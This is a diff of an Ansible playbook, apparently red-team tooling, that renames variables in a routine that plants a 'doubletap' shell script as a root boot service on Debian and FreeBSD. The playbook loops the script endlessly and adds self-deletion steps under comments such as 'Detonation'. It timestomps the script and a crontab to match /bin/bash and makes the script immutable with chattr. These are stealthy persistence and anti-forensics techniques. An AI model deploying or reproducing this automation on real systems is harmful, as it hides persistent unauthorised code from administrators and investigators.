@@ -1,27 +1,27 @@
 ---
-- name: Define variables for paths and filenames
-  set_fact:
-    script_path: "/bin/doubletap2"
-    service_name: "Doubletap"
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_sh_loop_script_path: "/bin/doubletap2"
+#    doubletap_sh_loop_service_name: "Doubletap"
 
 - name: Copy shell script to target system
   copy:
     src: "files/doubletap.sh"
-    dest: "{{ script_path }}"
+    dest: "{{ doubletap_sh_loop_script_path }}"
     owner: root
     group: root
     mode: '0755'
 
 - name: Modify script to add while loop
   lineinfile:
-    path: "{{ script_path }}"
+    path: "{{ doubletap_sh_loop_script_path }}"
     line: |
       while true; do
     insertafter: "# Start of loop"
 
 - name: Modify script to end while loop
   lineinfile:
-    path: "{{ script_path }}"
+    path: "{{ doubletap_sh_loop_script_path }}"
     line: |
         sleep 60
       done
@@ -29,12 +29,12 @@
 
 - name: Create init.d startup script
   copy:
-    dest: "/etc/init.d/{{ service_name }}"
+    dest: "/etc/init.d/{{ doubletap_sh_loop_service_name }}"
     mode: "0755"
     content: |
       #!/bin/sh
       ### BEGIN INIT INFO
-      # Provides:          {{ service_name }}
+      # Provides:          {{ doubletap_sh_loop_service_name }}
       # Required-Start:    $network $remote_fs
       # Required-Stop:     $network $remote_fs
       # Default-Start:     2 3 4 5
@@ -44,12 +44,12 @@
 
       case "$1" in
         start)
-          echo "Starting {{ service_name }}"
-          nohup {{ script_path }} &> /dev/null &
+          echo "Starting {{ doubletap_sh_loop_service_name }}"
+          nohup {{ doubletap_sh_loop_script_path }} &> /dev/null &
           ;;
         stop)
-          echo "Stopping {{ service_name }}"
-          pkill -f "{{ script_path }}"
+          echo "Stopping {{ doubletap_sh_loop_service_name }}"
+          pkill -f "{{ doubletap_sh_loop_script_path }}"
           ;;
         restart)
           $0 stop
@@ -63,42 +63,42 @@
       exit 0
 
 - name: Enable service on boot (Ubuntu)
-  command: update-rc.d {{ service_name }} defaults
+  command: update-rc.d {{ doubletap_sh_loop_service_name }} defaults
   when: ansible_os_family == "Debian"
 
 - name: Enable service on boot (FreeBSD)
   lineinfile:
     path: "/etc/rc.conf"
-    line: "{{ service_name }}_enable=\"YES\""
+    line: "{{ doubletap_sh_loop_service_name }}_enable=\"YES\""
   when: ansible_os_family == "FreeBSD"
 
 - name: Start the service
-  command: "/etc/init.d/{{ service_name }} start"
+  command: "/etc/init.d/{{ doubletap_sh_loop_service_name }} start"
 
 - name: Add command to delete the script after execution
   lineinfile:
-    path: "{{ script_path }}"
-    line: "rm -f {{ script_path }}"
+    path: "{{ doubletap_sh_loop_script_path }}"
+    line: "rm -f {{ doubletap_sh_loop_script_path }}"
     insertafter: "# Cleanup after explosion"
 
 - name: Add script removal from startup task to the script
   lineinfile:
-    path: "{{ script_path }}"
-    line: "update-rc.d -f {{ service_name }} remove"
+    path: "{{ doubletap_sh_loop_script_path }}"
+    line: "update-rc.d -f {{ doubletap_sh_loop_service_name }} remove"
     insertafter: "# Detonation"
 
 - name: Remove init.d script after execution (cleanup)
   lineinfile:
-    path: "{{ script_path }}"
-    line: "rm -f /etc/init.d/{{ service_name }}"
+    path: "{{ doubletap_sh_loop_script_path }}"
+    line: "rm -f /etc/init.d/{{ doubletap_sh_loop_service_name }}"
     insertafter: "# Detonation"
 
 - name: Timestomp the crontab file
   command: touch -r /bin/bash /var/spool/cron/crontabs/{{ cron_job_user }}
 
 - name: Timestomp script to match /bin/bash creation time
-  command: touch -r /bin/bash {{ script_path }}
+  command: touch -r /bin/bash {{ doubletap_sh_loop_script_path }}
 
 # TODO check that this should go after timestomp
 - name: Set immutable attribute on script
-  command: "chattr +i {{ script_path }}"
+  command: "chattr +i {{ doubletap_sh_loop_script_path }}"
